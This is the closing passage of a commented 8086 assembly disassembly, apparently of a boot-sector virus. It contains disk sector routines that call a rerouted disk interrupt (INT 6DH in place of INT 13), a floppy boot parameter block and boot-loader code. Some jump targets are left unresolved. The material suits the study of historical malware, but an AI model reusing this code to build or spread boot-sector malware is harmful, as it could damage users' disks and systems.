;        DS:[602H] = SECTOR COUNT                ;
;        DS:[226H] = DRIVE                       ;
;        DS:[0009] = HEAD                        ;
;        DS:[000A] = SECTOR                      ;
;        DS:[000B] = TRACK                       ;
;-----------------------------------------------------------------------;
DO_SECTORS:                  ;0870
    PUSH BX             ;
    MOV  CX,4           ;RETRY COUNT = 4
                        ;
D1S_10:  PUSH CX             ;
    MOV  DH,[9]              ;HEAD = 9
    MOV  DL,[226H]      ;DRIVE
    MOV  CX,[10]             ;TRACK/SECT
    MOV  AX,[602H]      ;COMMAND/COUNT
    INT  6DH            ;(SAME AS INT 13)
    JNB  D1S_80              ;
                        ;
    MOV  AH,00               ;RESET
    INT  6DH            ;(SAME AS INT 13)
    POP  CX             ;
    LOOP D1S_10              ;TRY AGAIN
    POP  BX             ;
    POP  BX             ;
    STC                 ;RETURN ERROR
    RET                 ;
                        ;
D1S_80:  POP  CX             ;0893 59
    POP  BX             ;0894 5B
    RET                 ;0895 C3
                        ;
;-----------------------------------------------------------------------;
; INC. NEXT SECTOR                               ;
; ON ENTRY:   DS:[0009] = HEAD                        ;
;        DS:[000A] = SECTOR                      ;
;        DS:[000B] = TRACK                       ;
;-----------------------------------------------------------------------;
NEXT_SECTOR:                 ;0896
    INC  Byte Ptr [10]       ;SECTOR
    CMP  Byte Ptr [10],10    ;
    JNZ  NS_90               ;
    MOV  Byte Ptr [10],1          ;
    INC  Byte Ptr [9]        ;HEAD
    CMP  Byte Ptr [9],2      ;
    JNZ  NS_90               ;
    MOV  Byte Ptr [9],0      ;
    INC  Byte Ptr [11]       ;TRACK
NS_90:   RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    DB   64             ;08BB 'dtk'
    JZ   ;091F               ;
                        ;
;---------------------------------------;
    JMP  CONTINUE_4          ;08FA
                        ;
         DB   'IBM X3.2'     ;OEM NAME AND VERSION
                        ;
         DW   512       ;BYTES PER SECTOR
         DB   2         ;SECTORS PER ALLOCATION UNIT
         DW   1         ;RESERVED SECTORS
         DB   2         ;NUMBER OF FATS
         DW   112       ;NUMBER OF ROOT DIR ENTRIES
         DW   2D0H      ;SECTORS PER DISK
         DB   0FDH      ;MEDIA ID
         DW   2         ;SECTORS PER FAT
         DW   9         ;SECTORS PER TRACK
         DW   2         ;NUMBER OF HEADS
         DW   0         ;HIDDEN SECTORS
                        ;
;---------------------------------------;
         DB   0,0
         DB   0,0,0,0,0,0,0,0,0,0,0,0,0,0

         DB   002H,0DFH
         DB   002H,025H,002H,012H
         DB   02AH,0FFH,050H,0F6H
         DB   000H,002H,

;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    INT  19H            ;REBOOT
                        ;
L08FA:   CLI                 ;08FA FA
    XOR  AX,AX               ;08FB 33C0
    MOV  ES,AX               ;08FD 8EC0
    MOV  SS,AX               ;08FF 8ED0
    MOV  SP,7C00             ;0901 BC007C
    MOV  DS,AX               ;0904 8ED8
    MOV  BX,07C0             ;0906 BBC007
    MOV  Word Ptr [0078],002F     ;0909 C70678002F00
    MOV  [007A],BX      ;090F 891E7A00
    MOV  DS,BX               ;0913 8EDB
    MOV  DX,[001E]      ;0915 8B161E00
    MOV  [0020],DL      ;0919 88162000
    INT  13             ;GO TO DISK
    JNB  ;0924               ;091F 7303
    JMP  ;09FC               ;0921 E9D800
    MOV  SI,000B             ;0924 BE0B00
    MOV  CX,[SI]             ;0927 8B0C
    SHR  CH,1           ;0929 D0ED
    XCHG CH,CL               ;092B 86E9
    MOV  [002B],CX      ;092D 890E2B00
    MOV  AL,[SI+05]          ;0931 8A4405
    XOR  AH,AH               ;0934 32E4
    MUL  Word Ptr [SI+0B]    ;0936 F7640B
    ADD  AX,[SI+03]          ;0939 034403
    ADD  AX,[SI+11]          ;093C 034411
    MOV  [0024],AX      ;093F A32400
    MOV  BX,7E00             ;0942 BB007E
    CALL 0A24           ;0945 E8DC00
    MOV  BX,ES               ;0948 8CC3
    MOV  AX,0070             ;094A B87000
    MOV  ES,AX               ;094D 8EC0
    MOV  AX,0020             ;094F B82000
    MUL  Word Ptr [SI+06]    ;0952 F76406
    MOV  CX,[SI]             ;0955 8B0C
    ADD  AX,CX               ;0957 03C1
    DEC  AX             ;0959 48
    DIV  CX             ;095A F7F1
    ADD  [0024],AX      ;095C 01062400
    MOV  CL,[002A]      ;0960 8A0E2A00
    MOV  AX,[0024]      ;0964 A12400
    CALL ;0971               ;0967 E80700
    PUSH ES             ;096A 06
    POP  DS             ;096B 1F
    JMP  0070:0000      ;096C EA00007000
                        ;
;HEAVY NUMBER CRUNCHING HERE      ;
    PUSH BX             ;0971 53
    PUSH AX             ;0972 50
    MOV  AL,CL               ;0973 8AC1
    MUL  Byte Ptr [002B]          ;0975 F6262B00
    MOV  [0029],AL      ;0979 A22900
    POP  AX             ;097C 58
    MUL  Word Ptr [002B]          ;097D F7262B00
    DIV  Word Ptr [SI+0D]    ;0981 F7740D
    INC  DL             ;0984 FEC2
    MOV  [0028],DL      ;0986 88162800
    PUSH DX             ;098A 52
    XOR  DX,DX               ;098B 33D2
    DIV  Word Ptr [SI+0F]    ;098D F7740F
    MOV  [0021],DL      ;0990 88162100
    MOV  [0026],AX      ;0994 A32600
    POP  DX             ;0997 5A
    MOV  CL,[0029]      ;0998 8A0E2900
    ADD  DL,CL               ;099C 02D1
    MOV  AX,[SI+0D]          ;099E 8B440D
    INC  AX             ;09A1 40
    CMP  DL,AL               ;09A2 3AD0
    JBE  ;09AC               ;09A4 7606
    SUB  AL,[0028]      ;09A6 2A062800
    MOV  CL,AL               ;09AA 8AC8
    MOV  AL,CL               ;09AC 8AC1
    MOV  DX,[0026]      ;09AE 8B162600
    MOV  CL,06               ;09B2 B106
    SHL  DH,CL               ;09B4 D2E6
    OR   DH,[0028]      ;09B6 0A362800
    MOV  CX,DX               ;09BA 8BCA
    XCHG CH,CL               ;09BC 86E9
    MOV  DX,[0020]      ;09BE 8B162000
    MOV  AH,02               ;READ SECTOR
    PUSH AX             ;
    INT  13             ;
    POP  AX             ;09C7 58
    JB   ;09FC               ;09C8 7232
    SUB  [0029],AL      ;09CA 28062900
    JBE  ;09F5               ;09CE 7625
    CBW                 ;09D0 98
    MUL  Word Ptr [002D]          ;09D1 F7262D00
    ADD  BX,AX               ;09D5 03D8
    INC  Byte Ptr [0021]          ;09D7 FE062100
    MOV  DL,[0021]      ;09DB 8A162100
    CMP  DL,[SI+0F]          ;09DF 3A540F
    MOV  DL,01               ;09E2 B201
    MOV  [0028],DL      ;09E4 88162800
    JB   ;0998               ;09E8 72AE
    MOV  Byte Ptr [0021],00  ;09EA C606210000
    INC  Word Ptr [0026]          ;09EF FF062600
    JMP  ;0998               ;09F3 EBA3
    POP  BX             ;09F5 5B
    RET                 ;09F6 C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    MOV  SI,01B3             ;09F7 BEB301
    JMP  ;09FF               ;09FA EB03
    MOV  SI,01C5             ;09FC BEC501
    CALL L0A15               ;09FF E81300
    MOV  SI,01D4             ;0A02 BED401
    CALL L0A15               ;0A05 E80D00
    MOV  AH,00               ;0A08 B400
    INT  16             ;0A0A CD16
    MOV  AH,01               ;0A0C B401
    INT  16             ;0A0E CD16
    JNZ  0A0C           ;0A10 75FA
    JMP  ;08F8               ;0A12 E9E3FE
                        ;
L0A15:   LODSB                    ;L0A15
    OR   AL,AL               ;0A16 0AC0
    JZ   0A23           ;0A18 7409
    MOV  AH,0E               ;0A1A B40E
    MOV  BX,0007             ;0A1C BB0700
    INT  10             ;0A1F CD10
    JMP  L0A15               ;0A21 EBF2
    RET                 ;0A23 C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;

    MOV  CL,01               ;0A24 B101
    CALL ;0971               ;0A26 E848FF
    PUSH SI             ;0A29 56
    MOV  DI,BX               ;0A2A 8BFB
    MOV  AX,ES:[BX+1C]       ;0A2C 268B471C
    XOR  DX,DX               ;0A30 33D2
    DIV  Word Ptr [SI]       ;0A32 F734
    INC  AL             ;0A34 FEC0
    MOV  [002A],AL      ;0A36 A22A00
    MOV  SI,019D             ;0A39 BE9D01
    MOV  CX,000B             ;0A3C B90B00
    REPZ                ;0A3F F3
    CMPSB                    ;0A40 A6
    JNZ  ;09F7               ;0A41 75B4
    MOV  AX,ES:[BX+3A]       ;0A43 268B473A
    MOV  [0022],AX      ;0A47 A32200
    MOV  DI,BX               ;0A4A 8BFB
    ADD  DI,+20              ;0A4C 83C720
    MOV  SI,01A8             ;0A4F BEA801
    MOV  CX,000B             ;0A52 B90B00
    REPZ                ;0A55 F3
    CMPSB                    ;0A56 A6
    JNZ  ;09F7               ;0A57 759E
    POP  SI             ;0A59 5E
    RET                 ;0A5A C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
CODE     ENDS                ;
    END                 ;
